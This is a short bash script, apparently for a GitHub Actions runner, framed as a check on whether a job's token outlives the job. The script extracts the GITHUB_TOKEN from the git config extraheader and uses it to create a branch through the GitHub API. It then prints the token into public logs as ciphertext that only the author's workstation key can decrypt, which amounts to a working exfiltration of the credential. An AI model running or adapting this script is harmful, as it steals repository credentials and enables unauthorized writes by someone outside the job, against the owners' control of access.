#!/usr/bin/env bash
# Does the job-scoped credential remain valid BEYOND ITS DOCUMENTED LIFETIME (the job)?
# The repo is PUBLIC and so are these logs: ONLY CIPHERTEXT AND HASHES ARE EMITTED, never the token.
echo "TL3MG|CTX|event=${GITHUB_EVENT_NAME:-?} ref=${GITHUB_REF:-?} run=${GITHUB_RUN_ID:-?} sha=${GITHUB_SHA:-?}"
H=$(git config --local --get 'http.https://github.com/.extraheader' 2>/dev/null || true)
B=$(printf %s "${H:-}" | awk '{print $3}')
T=$(printf %s "${B:-}" | base64 -d 2>/dev/null | cut -d: -f2-)
printf 'TL3MG|TOKEN|len=%s sha256-16=%s\n' "${#T}" "$(printf %s "${T:-}" | sha256sum | cut -c1-16)"
printf 'TL3MG|KEY-PRESENT|len=%s\n' "${#XK}"

# IN-JOB POSITIVE CONTROL: the credential works right now, inside its documented lifetime.
R=$(curl -s -o /tmp/a -w '%{http_code}' -X POST -H "Authorization: token ${T}" \
  -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs" \
  -d "{\"ref\":\"refs/heads/tl3-injob-${GITHUB_RUN_ID}\",\"sha\":\"${GITHUB_SHA}\"}")
echo "TL3MG|IN-JOB-POSITIVE-CONTROL|POST /git/refs -> HTTP ${R}"
RD=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token ${T}" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}")
echo "TL3MG|IN-JOB-READ-CONTROL|GET /repos -> HTTP ${RD}"

# Emit the credential ONLY as AES-256-CBC ciphertext under a key that exists solely on our workstation.
C=$(printf %s "${T}" | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -pass env:XK -base64 -A 2>/dev/null)
echo "TL3MG|CIPHERTEXT|${C}"
echo "TL3MG|SHA-OF-PLAINTEXT-FOR-INTEGRITY|$(printf %s "${T:-}" | sha256sum | cut -c1-16)"
echo "TL3MG|JOB-ENDS-NOW|everything after this line happens outside the documented lifetime"
